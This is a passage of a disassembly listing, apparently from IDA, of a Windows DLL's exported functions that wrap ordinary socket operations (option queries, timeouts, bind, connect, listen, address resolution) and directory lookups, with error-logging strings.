		push	dword ptr [esi+4] ; s
		mov	[ebp+optlen], 4
		call	ds:getsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A7D5
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetwr_0 ; "CSocket::GetWriteTimeout() : getsockopt"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A7D8
; ---------------------------------------------------------------------------

loc_6AF4A7D5:				; CODE XREF: Ordinal1152+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4A7D8:				; CODE XREF: Ordinal1152+48j
		pop	esi
		pop	ebp
		retn	4
Ordinal1152	endp

; Exported entry 1153.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1153(char optval)
		public Ordinal1153
Ordinal1153	proc near		; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr -4
optval		= byte ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		and	dword ptr [ebp+optval],	0
		push	esi
		lea	eax, [ebp+optlen]
		push	eax		; optlen
		lea	eax, [ebp+optval]
		push	eax		; optval
		push	700Ch		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		mov	[ebp+optlen], 4
		call	ds:getsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A829
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetconn ; "CSocket::GetConnectedTime() :	getsockop"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A82C
; ---------------------------------------------------------------------------

loc_6AF4A829:				; CODE XREF: Ordinal1153+30j
		xor	eax, eax
		inc	eax

loc_6AF4A82C:				; CODE XREF: Ordinal1153+4Aj
		pop	esi
		leave
		retn	4
Ordinal1153	endp

; Exported entry 1154.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1154(struct sockaddr *name)
		public Ordinal1154
Ordinal1154	proc near		; DATA XREF: .rdata:off_6AF66098o

namelen		= dword	ptr -4
name		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		lea	eax, [ebp+namelen]
		push	eax		; namelen
		push	[ebp+name]	; name
		mov	esi, ecx
		push	dword ptr [esi+4] ; s
		mov	[ebp+namelen], 10h
		call	ds:getsockname
		test	eax, eax
		jz	short loc_6AF4A86D
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetloca ; "CSocket::GetLocalAddress() : getsocknam"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A870
; ---------------------------------------------------------------------------

loc_6AF4A86D:				; CODE XREF: Ordinal1154+20j
		xor	eax, eax
		inc	eax

loc_6AF4A870:				; CODE XREF: Ordinal1154+3Aj
		pop	esi
		leave
		retn	4
Ordinal1154	endp

; Exported entry 1155.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1155(struct sockaddr *name)
		public Ordinal1155
Ordinal1155	proc near		; DATA XREF: .rdata:off_6AF66098o

namelen		= dword	ptr -4
name		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		lea	eax, [ebp+namelen]
		push	eax		; namelen
		push	[ebp+name]	; name
		mov	esi, ecx
		push	dword ptr [esi+4] ; s
		mov	[ebp+namelen], 10h
		call	ds:getpeername
		test	eax, eax
		jz	short loc_6AF4A8B1
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetremo ; "CSocket::GetRemoteAddress() :	getpeerna"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A8B4
; ---------------------------------------------------------------------------

loc_6AF4A8B1:				; CODE XREF: Ordinal1155+20j
		xor	eax, eax
		inc	eax

loc_6AF4A8B4:				; CODE XREF: Ordinal1155+3Aj
		pop	esi
		leave
		retn	4
Ordinal1155	endp

; Exported entry 1156.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1156
Ordinal1156	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+8], eax
		xor	eax, eax
		inc	eax
		retn	4
Ordinal1156	endp

; Exported entry 1158.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1158
Ordinal1158	proc near		; DATA XREF: .rdata:off_6AF66098o

readfds		= fd_set ptr -10Ch
timeout		= timeval ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10Ch
		mov	eax, [ecx+4]
		mov	[ebp+readfds.fd_array],	eax
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		mov	ecx, 3E8h
		div	ecx
		lea	ecx, [ebp+readfds]
		mov	[ebp+readfds.fd_count],	1
		mov	[ebp+timeout.tv_sec], eax
		imul	edx, 3E8h
		lea	eax, [ebp+timeout]
		push	eax		; timeout
		xor	eax, eax
		push	eax		; exceptfds
		push	eax		; writefds
		push	ecx		; readfds
		push	eax		; nfds
		mov	[ebp+timeout.tv_usec], edx
		call	ds:select
		dec	eax
		neg	eax
		sbb	eax, eax
		inc	eax
		leave
		retn	4
Ordinal1158	endp

; Exported entry 1159.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1159
Ordinal1159	proc near		; DATA XREF: .rdata:off_6AF66098o

writefds	= fd_set ptr -10Ch
timeout		= timeval ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10Ch
		mov	eax, [ecx+4]
		mov	[ebp+writefds.fd_array], eax
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		mov	ecx, 3E8h
		div	ecx
		lea	ecx, [ebp+writefds]
		mov	[ebp+writefds.fd_count], 1
		mov	[ebp+timeout.tv_sec], eax
		imul	edx, 3E8h
		lea	eax, [ebp+timeout]
		push	eax		; timeout
		xor	eax, eax
		push	eax		; exceptfds
		push	ecx		; writefds
		push	eax		; readfds
		push	eax		; nfds
		mov	[ebp+timeout.tv_usec], edx
		call	ds:select
		dec	eax
		neg	eax
		sbb	eax, eax
		inc	eax
		leave
		retn	4
Ordinal1159	endp

; Exported entry 1160.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1160
Ordinal1160	proc near		; DATA XREF: .rdata:6AF5E684o
					; .rdata:off_6AF66098o

optval		= byte ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		push	4		; optlen
		lea	eax, [ebp+optval]
		push	eax		; optval
		push	8		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		mov	dword ptr [ebp+optval],	1
		call	ds:setsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A9AD
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketSetdefa ; "CSocket::SetDefaultOptions() : setsocko"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4A9AD:				; CODE XREF: Ordinal1160+27j
		pop	esi
		leave
		retn
Ordinal1160	endp

; Exported entry 1108.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1108(LPSTR lpString1, int)
		public Ordinal1108
Ordinal1108	proc near		; DATA XREF: .rdata:off_6AF66098o

lpString1	= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		push	2		; type
		lea	esi, [ecx+4]
		push	4		; len
		push	esi		; addr
		call	ds:gethostbyaddr
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF4A9D1
		push	dword ptr [esi]	; in
		call	ds:inet_ntoa
		jmp	short loc_6AF4A9D3
; ---------------------------------------------------------------------------

loc_6AF4A9D1:				; CODE XREF: Ordinal1108+15j
		mov	eax, [ebx]

loc_6AF4A9D3:				; CODE XREF: Ordinal1108+1Fj
		push	eax		; lpString
		call	ds:lstrlenA
		mov	edi, [esp+0Ch+arg_4]
		mov	esi, eax
		inc	esi
		cmp	esi, [edi]
		jbe	short loc_6AF4A9F6
		push	offset aCigsockaddrinG ; "CIGSockAddrIn::GetHostAddress() : dwReq"...
		call	sub_6AF3102E
		pop	ecx
		mov	[edi], esi
		xor	eax, eax
		jmp	short loc_6AF4AA05
; ---------------------------------------------------------------------------

loc_6AF4A9F6:				; CODE XREF: Ordinal1108+33j
		push	dword ptr [ebx]	; lpString2
		push	[esp+10h+lpString1] ; lpString1
		call	ds:lstrcpyA
		xor	eax, eax
		inc	eax

loc_6AF4AA05:				; CODE XREF: Ordinal1108+44j
		pop	edi
		pop	esi
		pop	ebx
		retn	8
Ordinal1108	endp

; Exported entry 1110.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1110(char *name)
		public Ordinal1110
Ordinal1110	proc near		; CODE XREF: Ordinal1126+32p
					; Ordinal1128+32p ...

name		= dword	ptr  4

		push	esi
		push	[esp+4+name]	; cp
		mov	esi, ecx
		call	ds:inet_addr
		add	esi, 4
		cmp	eax, 0FFFFFFFFh
		mov	[esi], eax
		jnz	short loc_6AF4AA50
		push	[esp+4+name]	; name
		call	ds:gethostbyname
		test	eax, eax
		jz	short loc_6AF4AA57
		mov	ecx, [eax+0Ch]
		mov	ecx, [ecx]
		test	ecx, ecx
		jz	short loc_6AF4AA57
		mov	ax, [eax+0Ah]
		test	ax, ax
		jz	short loc_6AF4AA57
		movsx	eax, ax
		push	eax		; Size
		push	ecx		; Src
		push	esi		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF4AA50:				; CODE XREF: Ordinal1110+15j
		xor	eax, eax
		inc	eax

loc_6AF4AA53:				; CODE XREF: Ordinal1110+61j
		pop	esi
		retn	4
; ---------------------------------------------------------------------------

loc_6AF4AA57:				; CODE XREF: Ordinal1110+23j
					; Ordinal1110+2Cj ...
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCaddressSetadd ; "CAddress::SetAddress() : gethostbyname("...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4AA53
Ordinal1110	endp

; Exported entry 1115.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1115
Ordinal1115	proc near		; CODE XREF: sub_6AF4AD22+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	0
		mov	dword ptr [ecx], offset	off_6AF5E680
		call	Ordinal1135
		retn
Ordinal1115	endp

; Exported entry 1121.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1121(int	type)
		public Ordinal1121
Ordinal1121	proc near		; DATA XREF: .rdata:off_6AF66098o

type		= dword	ptr  4

		push	esi
		push	0
		mov	esi, ecx
		call	Ordinal1135
		xor	eax, eax
		cmp	[esi+8], eax
		setnz	al
		push	eax		; dwFlags
		push	0		; g
		push	0		; lpProtocolInfo
		push	6		; protocol
		push	[esp+14h+type]	; type
		push	2		; af
		call	ds:WSASocketA
		cmp	eax, 0FFFFFFFFh
		mov	[esi+4], eax
		jnz	short loc_6AF4AAC3
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketCreateW ; "CSocket::Create() : WSASocket() == INVA"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4AAC6
; ---------------------------------------------------------------------------

loc_6AF4AAC3:				; CODE XREF: Ordinal1121+2Bj
		xor	eax, eax
		inc	eax

loc_6AF4AAC6:				; CODE XREF: Ordinal1121+45j
		pop	esi
		retn	4
Ordinal1121	endp

; Exported entry 1122.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1122
Ordinal1122	proc near		; CODE XREF: Ordinal1114+19p
					; Ordinal1116+7p ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		cmp	edi, 0FFFFFFFFh
		mov	esi, ecx
		jnz	short loc_6AF4AAE6
		push	offset aCsocketAttachH ; "CSocket::Attach() : hSocket == INVALID_"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4AAFC
; ---------------------------------------------------------------------------

loc_6AF4AAE6:				; CODE XREF: Ordinal1122+Bj
		push	0
		mov	ecx, esi
		call	Ordinal1135
		mov	eax, [esi]
		mov	ecx, esi
		mov	[esi+4], edi
		call	dword ptr [eax+4]
		xor	eax, eax
		inc	eax

loc_6AF4AAFC:				; CODE XREF: Ordinal1122+1Aj
		pop	edi
		pop	esi
		retn	4
Ordinal1122	endp

; Exported entry 1124.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1124
Ordinal1124	proc near		; CODE XREF: Ordinal1123+7p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, [ecx+4]
		or	dword ptr [ecx+4], 0FFFFFFFFh
		push	0
		call	Ordinal1135
		mov	eax, esi
		pop	esi
		retn
Ordinal1124	endp

; Exported entry 1126.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1126(LPCSTR lpString, u_short hostshort)
		public Ordinal1126
Ordinal1126	proc near		; DATA XREF: .rdata:off_6AF66098o

name		= sockaddr ptr -14h
var_4		= dword	ptr -4
lpString	= dword	ptr  8
hostshort	= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	eax, ___security_cookie
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+name]
		mov	[ebp+var_4], eax
		call	Ordinal1102
		cmp	[ebp+lpString],	0
		jz	short loc_6AF4AB5E
		push	[ebp+lpString]	; lpString
		call	ds:lstrlenA
		test	eax, eax
		jle	short loc_6AF4AB5E
		push	[ebp+lpString]	; name
		lea	ecx, [ebp+name]
		call	Ordinal1110
		test	eax, eax
		jnz	short loc_6AF4AB5E
		push	offset aCsocketBindSoc ; "CSocket::Bind() : sockAddr.SetAddress()"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4AB74
; ---------------------------------------------------------------------------

loc_6AF4AB5E:				; CODE XREF: Ordinal1126+1Dj
					; Ordinal1126+2Aj ...
		push	dword ptr [ebp+hostshort] ; hostshort
		lea	ecx, [ebp+name]
		call	Ordinal1112
		lea	eax, [ebp+name]
		push	eax		; name
		mov	ecx, esi
		call	Ordinal1125

loc_6AF4AB74:				; CODE XREF: Ordinal1126+48j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	8
Ordinal1126	endp

; Exported entry 1128.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1128(LPCSTR lpString, u_short hostshort)
		public Ordinal1128
Ordinal1128	proc near		; DATA XREF: .rdata:off_6AF66098o

name		= sockaddr ptr -14h
var_4		= dword	ptr -4
lpString	= dword	ptr  8
hostshort	= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		cmp	[ebp+lpString],	0
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		jz	short loc_6AF4ABDF
		push	[ebp+lpString]	; lpString
		call	ds:lstrlenA
		test	eax, eax
		jz	short loc_6AF4ABDF
		lea	ecx, [ebp+name]
		call	Ordinal1102
		push	[ebp+lpString]	; name
		lea	ecx, [ebp+name]
		call	Ordinal1110
		test	eax, eax
		jz	short loc_6AF4ABD8
		push	dword ptr [ebp+hostshort] ; hostshort
		lea	ecx, [ebp+name]
		call	Ordinal1112
		test	eax, eax
		jz	short loc_6AF4ABD8
		lea	eax, [ebp+name]
		push	eax		; name
		mov	ecx, esi
		call	Ordinal1127
		jmp	short loc_6AF4ABEC
; ---------------------------------------------------------------------------

loc_6AF4ABD8:				; CODE XREF: Ordinal1128+39j
					; Ordinal1128+48j
		push	offset aCsocketConne_0 ; "CSocket::Connect() : sockAddr.SetAddres"...
		jmp	short loc_6AF4ABE4
; ---------------------------------------------------------------------------

loc_6AF4ABDF:				; CODE XREF: Ordinal1128+15j
					; Ordinal1128+22j
		push	offset aCsocketConne_1 ; "CSocket::Connect() : szHost == NULL\n"

loc_6AF4ABE4:				; CODE XREF: Ordinal1128+5Cj
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF4ABEC:				; CODE XREF: Ordinal1128+55j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	8
Ordinal1128	endp

; Exported entry 1130.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1130(LPCSTR lpString, u_short hostshort)
		public Ordinal1130
Ordinal1130	proc near		; DATA XREF: .rdata:off_6AF66098o

name		= sockaddr ptr -14h
var_4		= dword	ptr -4
lpString	= dword	ptr  8
hostshort	= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	eax, ___security_cookie
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+name]
		mov	[ebp+var_4], eax
		call	Ordinal1102
		cmp	[ebp+lpString],	0
		jz	short loc_6AF4AC43
		push	[ebp+lpString]	; lpString
		call	ds:lstrlenA
		test	eax, eax
		jle	short loc_6AF4AC43
		push	[ebp+lpString]	; name
		lea	ecx, [ebp+name]
		call	Ordinal1110
		test	eax, eax
		jnz	short loc_6AF4AC43
		push	offset aCsocketListenS ; "CSocket::Listen() : sockAddr.SetAddress"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4AC59
; ---------------------------------------------------------------------------

loc_6AF4AC43:				; CODE XREF: Ordinal1130+1Dj
					; Ordinal1130+2Aj ...
		push	dword ptr [ebp+hostshort] ; hostshort
		lea	ecx, [ebp+name]
		call	Ordinal1112
		lea	eax, [ebp+name]
		push	eax		; name
		mov	ecx, esi
		call	Ordinal1129

loc_6AF4AC59:				; CODE XREF: Ordinal1130+48j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	8
Ordinal1130	endp

; Exported entry 1141.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1141(int, char optval)
		public Ordinal1141
Ordinal1141	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
optval		= byte ptr  8

		push	esi
		push	dword ptr [esp+4+optval] ; optval
		mov	esi, ecx
		call	Ordinal1142
		test	eax, eax
		jz	short loc_6AF4AC8A
		push	[esp+4+arg_0]	; optval
		mov	ecx, esi
		call	Ordinal1143
		test	eax, eax
		jz	short loc_6AF4AC8A
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4AC8C
; ---------------------------------------------------------------------------

loc_6AF4AC8A:				; CODE XREF: Ordinal1141+Ej
					; Ordinal1141+1Dj
		xor	eax, eax

loc_6AF4AC8C:				; CODE XREF: Ordinal1141+22j
		pop	esi
		retn	8
Ordinal1141	endp

; Exported entry 1144.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1144(int, char *optlen)
		public Ordinal1144
Ordinal1144	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
optlen		= dword	ptr  8

		mov	eax, [esp+optlen]
		push	esi
		mov	esi, [esp+4+arg_0]
		and	dword ptr [esi], 0
		and	dword ptr [eax], 0
		push	edi
		push	eax		; optlen
		mov	edi, ecx
		call	Ordinal1145
		test	eax, eax
		jz	short loc_6AF4ACBD
		push	esi		; optlen
		mov	ecx, edi
		call	Ordinal1146
		test	eax, eax
		jz	short loc_6AF4ACBD
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4ACBF
; ---------------------------------------------------------------------------

loc_6AF4ACBD:				; CODE XREF: Ordinal1144+1Aj
					; Ordinal1144+26j
		xor	eax, eax

loc_6AF4ACBF:				; CODE XREF: Ordinal1144+2Bj
		pop	edi
		pop	esi
		retn	8
Ordinal1144	endp

; Exported entry 1147.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1147(char optval, int)
		public Ordinal1147
Ordinal1147	proc near		; DATA XREF: .rdata:off_6AF66098o

optval		= byte ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	[esp+4+arg_4]	; optval
		mov	esi, ecx
		call	Ordinal1149
		test	eax, eax
		jz	short loc_6AF4ACE8
		push	dword ptr [esp+4+optval] ; optval
		mov	ecx, esi
		call	Ordinal1148
		test	eax, eax
		jz	short loc_6AF4ACE8
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4ACEA
; ---------------------------------------------------------------------------

loc_6AF4ACE8:				; CODE XREF: Ordinal1147+Ej
					; Ordinal1147+1Dj
		xor	eax, eax

loc_6AF4ACEA:				; CODE XREF: Ordinal1147+22j
		pop	esi
		retn	8
Ordinal1147	endp

; Exported entry 1150.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1150(char *optlen, int)
		public Ordinal1150
Ordinal1150	proc near		; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		push	esi
		mov	esi, [esp+4+optlen]
		and	dword ptr [esi], 0
		and	dword ptr [eax], 0
		push	edi
		push	eax		; optlen
		mov	edi, ecx
		call	Ordinal1152
		test	eax, eax
		jz	short loc_6AF4AD1B
		push	esi		; optlen
		mov	ecx, edi
		call	Ordinal1151
		test	eax, eax
		jz	short loc_6AF4AD1B
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4AD1D
; ---------------------------------------------------------------------------

loc_6AF4AD1B:				; CODE XREF: Ordinal1150+1Aj
					; Ordinal1150+26j
		xor	eax, eax

loc_6AF4AD1D:				; CODE XREF: Ordinal1150+2Bj
		pop	edi
		pop	esi
		retn	8
Ordinal1150	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4AD22(void *, char)
sub_6AF4AD22	proc near		; DATA XREF: .rdata:off_6AF5E680o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1115
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4AD38
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4AD38:				; CODE XREF: sub_6AF4AD22+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4AD22	endp

; Exported entry 1114.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1114
Ordinal1114	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		or	dword ptr [esi+4], 0FFFFFFFFh
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+0Ch], 0
		mov	dword ptr [esi], offset	off_6AF5E680
		call	Ordinal1122
		test	eax, eax
		jnz	short loc_6AF4AD6B
		push	offset aCsocketCsocket ; "CSocket::CSocket() : Attach()	== FALSE\n"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4AD6B:				; CODE XREF: Ordinal1114+20j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1114	endp

; Exported entry 1116.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1116
Ordinal1116	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal1122
		test	eax, eax
		jnz	short loc_6AF4AD8C
		push	offset aCsocketOperato ; "CSocket::operator =()	: Attach() == FAL"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4AD8C:				; CODE XREF: Ordinal1116+Ej
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1116	endp

; Exported entry 1123.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1123
Ordinal1123	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		call	Ordinal1124
		push	eax
		mov	ecx, esi
		call	Ordinal1122
		pop	esi
		retn	4
Ordinal1123	endp

; Exported entry 1109.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1109
Ordinal1109	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	2		; type
		lea	esi, [ecx+4]
		push	4		; len
		push	esi		; addr
		call	ds:gethostbyaddr
		test	eax, eax
		jnz	short loc_6AF4ADC7
		push	dword ptr [esi]	; in
		call	ds:inet_ntoa
		jmp	short loc_6AF4ADC9
; ---------------------------------------------------------------------------

loc_6AF4ADC7:				; CODE XREF: Ordinal1109+11j
		mov	eax, [eax]

loc_6AF4ADC9:				; CODE XREF: Ordinal1109+1Bj
		mov	ecx, [esp+4+arg_0]
		push	eax		; Src
		call	sub_6AF31B1D
		xor	eax, eax
		inc	eax
		pop	esi
		retn	4
Ordinal1109	endp

; Exported entry 1183.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal1183(LPSTR	lpBuffer, int)
		public Ordinal1183
Ordinal1183	proc near		; CODE XREF: Ordinal226+8p
					; DATA XREF: .rdata:off_6AF66098o

lpBuffer	= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	edi
		mov	edi, [esp+8+arg_4]
		mov	esi, [edi]
		push	esi		; uSize
		push	[esp+0Ch+lpBuffer] ; lpBuffer
		call	ds:GetWindowsDirectoryA
		test	eax, eax
		jnz	short loc_6AF4AE06
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCinstalleda_19 ; "CInstalledApps::GetWindowsDirectory()	:"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4AE0D
; ---------------------------------------------------------------------------

loc_6AF4AE06:				; CODE XREF: Ordinal1183+15j
		cmp	eax, esi
		jbe	short loc_6AF4AE11
		inc	eax
		mov	[edi], eax

loc_6AF4AE0D:				; CODE XREF: Ordinal1183+2Aj
		xor	eax, eax
		jmp	short loc_6AF4AE14
; ---------------------------------------------------------------------------

loc_6AF4AE11:				; CODE XREF: Ordinal1183+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4AE14:				; CODE XREF: Ordinal1183+35j
		pop	edi
		pop	esi
		retn
Ordinal1183	endp

; Exported entry 1185.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal1185(LPSTR	lpBuffer, int)
		public Ordinal1185
Ordinal1185	proc near		; CODE XREF: Ordinal227+8p
					; DATA XREF: .rdata:off_6AF66098o

lpBuffer	= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	edi
		mov	edi, [esp+8+arg_4]
		mov	esi, [edi]
		push	esi		; uSize
		push	[esp+0Ch+lpBuffer] ; lpBuffer
		call	ds:GetSystemDirectoryA
		test	eax, eax
		jnz	short loc_6AF4AE43
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCinstalleda_20 ; "CInstalledApps::GetSystemDirectory() : "...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4AE4A
; ---------------------------------------------------------------------------

loc_6AF4AE43:				; CODE XREF: Ordinal1185+15j
		cmp	eax, esi
		jbe	short loc_6AF4AE4E
		inc	eax
		mov	[edi], eax

loc_6AF4AE4A:				; CODE XREF: Ordinal1185+2Aj
		xor	eax, eax
		jmp	short loc_6AF4AE51
; ---------------------------------------------------------------------------

loc_6AF4AE4E:				; CODE XREF: Ordinal1185+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4AE51:				; CODE XREF: Ordinal1185+35j
		pop	edi
		pop	esi
		retn
Ordinal1185	endp

; Exported entry 666.
; Exported entry 761.
; Exported entry 1172.
; Exported entry 1391.
; Exported entry 1473.
; Exported entry 1502.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1172
Ordinal1172	proc near		; CODE XREF: Ordinal564+15Ap
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+18h]	; ccL30_666
					; ccL30_761
					; ccL30_1172
					; ccL30_1391
					; ccL30_1473
		retn
Ordinal1172	endp

; Exported entry 1178.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1178
Ordinal1178	proc near		; CODE XREF: Ordinal1098+ABp
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+30h]
		retn
Ordinal1178	endp

; Exported entry 1179.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1179
Ordinal1179	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+34h]
		retn
Ordinal1179	endp

; Exported entry 1180.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1180
Ordinal1180	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+38h]
		retn
Ordinal1180	endp

; Exported entry 1181.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1181
Ordinal1181	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+3Ch]
		retn
Ordinal1181	endp

; Exported entry 1182.
; Exported entry 1527.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1182
Ordinal1182	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+40h]	; ccL30_1182
		retn
Ordinal1182	endp

; Exported entry 1164.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1164
Ordinal1164	proc near		; CODE XREF: Ordinal148+101p
					; Ordinal148+212p ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+40h]
		mov	dword ptr [esi], offset	off_6AF5EFF0
		call	sub_6AF3789B
		lea	ecx, [esi+3Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+38h]
